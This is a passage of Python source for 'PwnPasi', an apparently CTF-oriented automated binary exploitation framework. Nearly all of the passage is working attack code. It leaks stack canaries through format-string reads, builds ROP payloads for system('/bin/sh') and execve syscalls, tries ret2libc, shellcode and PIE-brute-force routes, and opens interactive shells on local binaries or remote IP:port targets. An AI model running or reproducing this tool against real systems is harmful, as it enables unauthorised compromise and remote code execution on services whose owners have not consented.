	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system function address in program: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh string address in program: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary value is: {result}")
	result = int(result, 16)
	canary = p64(result)

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)

	if other_rdi_registers == 1:
		payload = flat([asm('nop') * padding, canary, b"AAAAAAAA" * diff, pop_rdi_addr, p64(bin_sh_addr), p64(0), ret_addr, p64(system_addr), p64(0)])
	elif other_rdi_registers == 0:
		payload = flat([asm('nop') * padding, canary, b"AAAAAAAA" * diff, pop_rdi_addr, p64(bin_sh_addr), ret_addr, p64(system_addr)])
	io.sendline(payload)
	io.interactive()

def execve_syscall_canary_remote(program, padding, pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, ret_addr, int_0x80, url, port, c, diff):
	if pop_ecx_addr == None:
		io = remote(url, port)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh string address in program: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_ebx_addr = int(pop_ecx_ebx_addr, 16)
		pop_ecx_ebx_addr = p32(pop_ecx_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary value is: {result}")
		result = int(result, 16)
		canary = p32(result)

		payload = flat([asm('nop') * padding, canary, b"AAAA" * diff, pop_eax_addr, 0xb, pop_ecx_ebx_addr, 0, bin_sh_addr, pop_edx_addr, 0, int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()
	else:
		io = remote(url, port)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh string address in program: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_addr = int(pop_ecx_addr, 16)
		pop_ecx_addr = p32(pop_ecx_addr)
		pop_ebx_addr = int(pop_ebx_addr, 16)
		pop_ebx_addr = p32(pop_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary value is: {result}")
		result = int(result, 16)
		canary = p32(result)

		payload = flat([asm('nop') * padding, canary, b"AAAA" * diff, pop_eax_addr, 0xb, pop_ebx_addr, bin_sh_addr, pop_ecx_addr, 0, pop_edx_addr, 0, int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()

def main():
    """Main function with improved argument parsing and flow"""
    print_banner()
    
    parser = argparse.ArgumentParser(
        description="PwnPasi - Automated Binary Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python pwnpasi.py -l ./target_binary
  python pwnpasi.py -l ./target_binary -f 112
  python pwnpasi.py -l ./target_binary -libc ./libc-2.19.so
  python pwnpasi.py -l ./target_binary -ip 192.168.1.100 -p 9999
        """
    )
    
    parser.add_argument('-l', '--local', type=str, required=True,
                       help='Target binary file (required)')
    parser.add_argument('-ip', '--ip', type=str,
                       help='Remote target IP address')
    parser.add_argument('-p', '--port', type=int,
                       help='Remote target port')
    parser.add_argument('-libc', '--libc', type=str,
                       help='Path to libc file')
    parser.add_argument('-f', '--fill', type=int,
                       help='Manual overflow padding size')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not os.path.exists(args.local):
        print_error(f"target binary not found: {args.local}")
        sys.exit(1)
    
    if (args.ip and not args.port) or (args.port and not args.ip):
        print_error("both IP and port must be specified for remote exploitation")
        sys.exit(1)
    
    # Initialize target information
    program = add_current_directory_prefix(args.local)
    libc_path = None
    bin_sh = 0  # Initialize bin_sh variable
    
    print_info(f"target binary: {Colors.YELLOW}{program}{Colors.END}")
    
    if args.ip and args.port:
        print_info(f"remote target: {Colors.YELLOW}{args.ip}:{args.port}{Colors.END}")
        remote_mode = True
    else:
        print_info("local exploitation mode")
        remote_mode = False
    
    # Set up libc
    if args.libc:
        if not os.path.exists(args.libc):
            print_error(f"libc file not found: {args.libc}")
            sys.exit(1)
        libc = args.libc
        print_info(f"using custom libc: {Colors.YELLOW}{libc}{Colors.END}")
    else:
        libc = 1
        libc_path = detect_libc(program)
    
    print_section_header("BINARY ANALYSIS PHASE")
    
    # Set permissions
    print_info("setting executable permissions")
    if not set_permission(program):
        print_warning("failed to set permissions, continuing anyway")
    
    # Collect binary information
    print_info("collecting binary security information")
    info_dict, stack_protection, rwx_segments, bit_arch, pie_enabled = collect_binary_info(program)
    display_binary_info(info_dict)
    
    print_section_header("FUNCTION ANALYSIS")
    
    # Analyze functions
    print_info("scanning PLT functions")
    function_addresses = scan_plt_functions(program)
    function_flags = set_function_flags(function_addresses)
    
    # Set global function flags
    for func, available in function_flags.items():
        globals()[func] = available
    
    print_section_header("ROP GADGET DISCOVERY")
    
    # Find ROP gadgets based on architecture
    if bit_arch == 64:
        print_info("searching for x64 ROP gadgets")
        pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers = find_rop_gadgets_x64(program)
    else:
        print_info("searching for x32 ROP gadgets")
        (pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, 
         ret_addr, int_0x80, eax, ebx, ecx, edx) = find_rop_gadgets_x32(program)
    
    print_section_header("PADDING CALCULATION")
    
    # Determine padding
    if args.fill:
        padding = args.fill
        print_info(f"using manual padding: {Colors.YELLOW}{padding}{Colors.END} bytes")
    else:
        print_info("performing dynamic stack overflow testing")
        padding = test_stack_overflow(program, bit_arch)
        if padding != 0:
            # Apply assembly-based padding adjustment
            adjusted_padding = asm_stack_overflow(program, bit_arch)
            if adjusted_padding:
                padding = adjusted_padding
            # Display vulnerable function information
            results = vuln_func_name()
            if results:
                print_section_header("VULNERABLE FUNCTIONS IDENTIFIED")
                for func_name in results:
                    print_success(f"vulnerable function: {Colors.RED}{func_name}{Colors.END}")
                print_section_header("ASSEMBLY CODE ANALYSIS")
                for func_name in results:
                    print_info(f"disassembling function: {Colors.YELLOW}{func_name}{Colors.END}")
                    os.system("objdump -d -M intel " + program + " --no-show-raw-insn | grep -A20 " + '"' + func_name + '"')
        else:
            # Try static analysis
            static_padding = analyze_vulnerable_functions(program, bit_arch)
            if static_padding:
                padding = static_padding
                print_success(f"static analysis found padding: {Colors.YELLOW}{padding}{Colors.END} bytes")
    
    print_section_header("STRING ANALYSIS")
    
    # Check for /bin/sh string
    print_info("searching for /bin/sh string in binary")
    bin_sh = check_binsh_string(program)
    
    # Handle canary protection (following pwnpasi_base.py logic)
    if stack_protection == 1:
        print_section_header("CANARY PROTECTION DETECTED")
        print_warning("canary protection is enabled")
        print_info("testing for format string vulnerability to bypass canary")
        fmtstr = detect_format_string_vulnerability(program)
        if fmtstr == 1:
            print_success("format string vulnerability detected")
            print_info("attempting to leak canary value")
            leakage_canary_value(program)
            padding, c, diff = canary_fuzz(program, bit_arch)
            if padding == None and c == None and diff == None:
                print_error("failed to leak canary value")
            else:
                print_success("canary value successfully leaked")
                if args.ip and args.port:
                    print_section_header("REMOTE EXPLOITATION")
                    print_info(f"targeting remote service at {Colors.YELLOW}{args.ip}:{args.port}{Colors.END}")
                    if globals().get('system', 0) == 1 and bin_sh == 1:
                        if bit_arch == 32:
                            ret2_system_x32_canary_remote(program,libc,padding,args.ip,args.port,c,diff)
                            sys.exit(0)
                        if bit_arch == 64:
                            ret2_system_x64_canary_remote(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,args.ip,args.port,c,diff)
                            sys.exit(0)
                    
                    if globals().get('puts', 0) == 1:
                        if bit_arch == 32:
                            ret2libc_put_x32_canary_remote(program,libc,padding,args.ip,args.port,c,diff)
                            sys.exit(0)
                        if bit_arch == 64:
                            ret2libc_put_x64_canary_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,args.ip,args.port,c,diff)
                            sys.exit(0)
                    
                    if globals().get('write', 0) == 1:
                        if bit_arch == 32:
                            ret2libc_write_x32_canary_remote(program,libc,padding,args.ip,args.port,c,diff)
                            sys.exit(0)
                        if bit_arch == 64:
                            ret2libc_write_x64_canary_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,args.ip,args.port,c,diff)
                            sys.exit(0)
                    
                    if bit_arch == 32:
                        if bin_sh == 1 and globals().get('eax', 0) == 1 and globals().get('ebx', 0) == 1 and globals().get('ecx', 0) == 1 and globals().get('edx', 0) == 1:
                            execve_syscall_canary_remote(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80,args.ip,args.port,c,diff)
                            sys.exit(0)
                else:
                    print_section_header("LOCAL EXPLOITATION")
                    print_info("executing local binary exploitation")
                    if globals().get('system', 0) == 1 and bin_sh == 1:
                        if bit_arch == 32:
                            ret2_system_canary_x32(program,libc,padding,libc_path,c,diff)
                            sys.exit(0)
                        if bit_arch == 64:
                            ret2_system_canary_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,libc_path,c,diff)
                            sys.exit(0)
                    
                    if globals().get('puts', 0) == 1:
                        if bit_arch == 32:
                            ret2libc_put_canary_x32(program,libc,libc_path,padding,c,diff)
                            sys.exit(0)
                        if bit_arch == 64:
                            ret2libc_put_canary_x64(program,libc,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path,padding,c,diff)
                            sys.exit(0)
                    
                    if globals().get('write', 0) == 1:
                        if bit_arch == 32:
                            ret2libc_write_canary_x32(program,libc,padding,libc_path,c,diff)
                            sys.exit(0)
                        if bit_arch == 64:
                            ret2libc_write_canary_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path,c,diff)
                            sys.exit(0)
                    
                    if bit_arch == 32:
                        if bin_sh == 1 and globals().get('eax', 0) == 1 and globals().get('ebx', 0) == 1 and globals().get('ecx', 0) == 1 and globals().get('edx', 0) == 1:
                            execve_canary_syscall(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80,c,diff)
                            sys.exit(0)
                
                sys.exit(0)
        else:
            print_error("no format string vulnerability found for canary bypass")
            print_warning("canary protection cannot be bypassed with current methods")
    
    # Stack overflow detection (following pwnpasi_base.py logic)
    if not args.fill:
        #print_section_header("VULNERABILITY ANALYSIS")
        #print_info("testing for stack overflow vulnerability")
        padding = test_stack_overflow(program, bit_arch)
        if padding != 0:
            padding = asm_stack_overflow(program, bit_arch)
            #print_success(f"stack overflow vulnerability detected with padding: {Colors.YELLOW}{padding}{Colors.END} bytes")
            results = vuln_func_name()
            
        else:
            print_warning("no stack overflow vulnerability detected through dynamic testing")
    
    print_section_header("EXPLOITATION PHASE")
    print_info("initializing exploitation attempts")
    
    # Format string vulnerability handling when no stack overflow
    if padding == 0:
        print_section_header("FORMAT STRING VULNERABILITY ANALYSIS")
        print_info("testing for format string vulnerability")
        fmtstr = detect_format_string_vulnerability(program)
        if check_binsh(program):
            print_success('/bin/sh string found in binary')
            bin_sh = 1
        else:
            print_warning('/bin/sh string not found in binary')
            bin_sh = 0

        if args.ip and args.port:
            print_section_header("REMOTE FORMAT STRING EXPLOITATION")
            print_info(f"targeting remote service at {Colors.YELLOW}{args.ip}:{args.port}{Colors.END}")
            if globals().get('system', 0) == 1 and bin_sh == 1:
                print_info('attempting to leak program strings via format string')
                fmtstr_print_strings_remote(program, args.ip, args.port)
                try:
                    offset = find_offset(program)
                    log.info(f"Offset found: \033[31m{offset}\033[0m")
                    result = find_ftmstr_bss_symbols(program)
                    if len(result) == 3:
                        function, buf_addr, function_name = result
                        system_fmtstr_remote(program, offset, buf_addr, args.ip, args.port)
                except ValueError:
                    print('[*]Offset not found, continuing with other exploitation methods')
                sys.exit(0)
            else:
                print_warning('system function or /bin/sh not available, attempting string leak only')
                fmtstr_print_strings_remote(program, args.ip, args.port)
                sys.exit(0)

        else:
            print_section_header("LOCAL FORMAT STRING EXPLOITATION")
            print_info("executing local format string exploitation")
            if globals().get('system', 0) == 1 and bin_sh == 1:
                print_info('attempting to leak program strings via format string')
                fmtstr_print_strings(program)
                try:
                    offset = find_offset(program)
                    log.info(f"Offset found: \033[31m{offset}\033[0m")
                    result = find_ftmstr_bss_symbols(program)
                    if len(result) == 3:
                        function, buf_addr, function_name = result
                        system_fmtstr(program, offset, buf_addr)
                except ValueError:
                    print('[*]Offset not found, continuing with other exploitation methods')
                sys.exit(0)
            else:
                print_warning('system function or /bin/sh not available, attempting string leak only')
                fmtstr_print_strings(program)
                sys.exit(0)
    else:
        # Stack overflow exploitation (following pwnpasi_base.py logic)
        if args.ip and args.port:
            print_section_header("REMOTE STACK OVERFLOW EXPLOITATION")
            print_info(f"targeting remote service at {Colors.YELLOW}{args.ip}:{args.port}{Colors.END}")
            if pie_enabled == 1 and globals().get('backdoor', 0) == 1:
                print_warning("PIE protection detected, but backdoor function available")
                print_info("initiating PIE bypass via backdoor function brute force")
                pie_backdoor_exploit_remote(program, padding, globals().get('backdoor', 0), libc_path, libc, args.ip, args.port, globals().get('callsystem', 0))
                sys.exit(0)
            
            if globals().get('system', 0) == 1 and bin_sh == 1:
                if bit_arch == 32:
                    ret2_system_x32_remote(program, libc, padding, args.ip, args.port)
                    sys.exit(0)
                if bit_arch == 64:
                    ret2_system_x64_remote(program, libc, padding, pop_rdi_addr, other_rdi_registers, ret_addr, args.ip, args.port)
                    sys.exit(0)
            
            if globals().get('write', 0) == 1:
                if bit_arch == 32:
                    ret2libc_write_x32_remote(program, libc, padding, args.ip, args.port)
                    sys.exit(0)
                if bit_arch == 64:
                    ret2libc_write_x64_remote(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, args.ip, args.port)
                    sys.exit(0)
            
            if globals().get('puts', 0) == 1:
                if bit_arch == 32:
                    ret2libc_put_x32_remote(program, libc, padding, args.ip, args.port)
                    sys.exit(0)
                if bit_arch == 64:
                    ret2libc_put_x64_remote(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, args.ip, args.port)
                    sys.exit(0)
            
            if rwx_segments == 1:
                if bit_arch == 32:
                    function, buf_addr, function_name = find_large_bss_symbols(program)
                    if function == 1:
                        rwx_shellcode_x32_remote(program, buf_addr, padding, function_name, ret_addr, args.ip, args.port)
                        sys.exit(0)
                if bit_arch == 64:
                    function, buf_addr, function_name = find_large_bss_symbols(program)
                    if function == 1:
                        rwx_shellcode_x64_remote(program, buf_addr, padding, function_name, ret_addr, args.ip, args.port)
                        sys.exit(0)
            
            if bit_arch == 32:
                if bin_sh == 1 and globals().get('eax', 0) == 1 and globals().get('ebx', 0) == 1 and globals().get('ecx', 0) == 1 and globals().get('edx', 0) == 1:
                    execve_syscall_remote(program, padding, pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, ret_addr, int_0x80, args.ip, args.port)
                    sys.exit(0)
        else:
            print_section_header("LOCAL STACK OVERFLOW EXPLOITATION")
            print_info("executing local stack overflow exploitation")
            if pie_enabled == 1 and globals().get('backdoor', 0) == 1:
                print_warning("PIE protection detected, but backdoor function available")
                print_info("initiating PIE bypass via backdoor function brute force")
                pie_backdoor_exploit(program, padding, globals().get('backdoor', 0), libc_path, libc, globals().get('callsystem', 0))
                sys.exit(0)
            
            if globals().get('system', 0) == 1 and bin_sh == 1:
                if bit_arch == 32:
                    ret2_system_x32(program, libc, padding, libc_path)
                    sys.exit(0)
                if bit_arch == 64:
                    ret2_system_x64(program, libc, padding, pop_rdi_addr, other_rdi_registers, ret_addr, libc_path)
                    sys.exit(0)
            
            if globals().get('write', 0) == 1:
                if bit_arch == 32:
                    ret2libc_write_x32(program, libc, padding, libc_path)
                    sys.exit(0)
                if bit_arch == 64:
                    ret2libc_write_x64(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, libc_path)
                    sys.exit(0)
            
            if globals().get('puts', 0) == 1:
                if bit_arch == 32:
                    ret2libc_put_x32(program, libc, padding, libc_path)
                    sys.exit(0)
                if bit_arch == 64:
                    ret2libc_put_x64(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, libc_path)
                    sys.exit(0)
            
            if rwx_segments == 1:
                if bit_arch == 32:
                    function, buf_addr, function_name = find_large_bss_symbols(program)
                    if function == 1:
                        rwx_shellcode_x32(program, buf_addr, padding, function_name, ret_addr)
                        sys.exit(0)
                if bit_arch == 64:
                    function, buf_addr, function_name = find_large_bss_symbols(program)
                    if function == 1:
                        rwx_shellcode_x64(program, buf_addr, padding, function_name, ret_addr, libc_path)
                        sys.exit(0)
            
            if bit_arch == 32:
                if bin_sh == 1 and globals().get('eax', 0) == 1 and globals().get('ebx', 0) == 1 and globals().get('ecx', 0) == 1 and globals().get('edx', 0) == 1:
                    execve_syscall(program, padding, pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, ret_addr, int_0x80)
                    sys.exit(0)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print_error("\ninterrupted by user")
        sys.exit(1)
    except Exception as e:
        print_critical(f"unexpected error: {e}")
        sys.exit(1)


